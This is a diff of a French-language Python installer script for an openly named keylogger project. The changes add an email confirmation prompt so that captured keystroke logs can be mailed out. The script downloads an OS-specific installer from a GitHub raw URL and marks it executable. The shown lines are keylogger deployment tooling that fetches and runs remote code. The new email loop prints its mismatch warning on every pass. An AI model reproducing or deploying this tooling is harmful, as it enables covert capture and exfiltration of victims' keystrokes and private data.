@@ -1,8 +1,8 @@
 import time
 import os
-
-
 import requests
+
+
 if os.name == 'nt':
     os.system("cls")
 else:
@@ -43,7 +43,7 @@ systemeExploitation = int(input("Êtes-vous sur windows ou linux ? Tapez 1 pour 
 while systemeExploitation!=1 and systemeExploitation!=2:
     systemeExploitation = int(input("Veuillez choisir 1 pour windows ou 2 pour linux"))
 
-#mail = str(input("Veuillez écrire votre mail pour recevoir le fichier txt dessus : "))
+
 
 if systemeExploitation==1:
     url="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_File_System/install_FileSystemWindows.py"
@@ -51,6 +51,15 @@ if systemeExploitation==1:
 else:
     url="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_File_System/install_FileSystemLinux.py"
     filename='install_FileSystemLinux.py'
+
+mail=''
+mailConfirm=''
+
+while mail!=mailConfirm:
+    mail = str(input("Veuillez écrire votre mail pour recevoir le fichier txt dessus : "))
+    mailConfirm = str(input("Veuillez confirmer votre mail : "))
+    print("Vos deux mails sont différents. \n")
+
 
 #-----------FIN RÉCOLTE INFOS DES MACHINES---------------
 
@@ -68,5 +77,6 @@ if response.status_code == 200:
 
     print(f'Le fichier {filename} a été téléchargé avec succès.')
     os.system('chmod +x ' + filename)
+
 
 #----------FIN INSTALLATION DU BON FICHIER-----------------
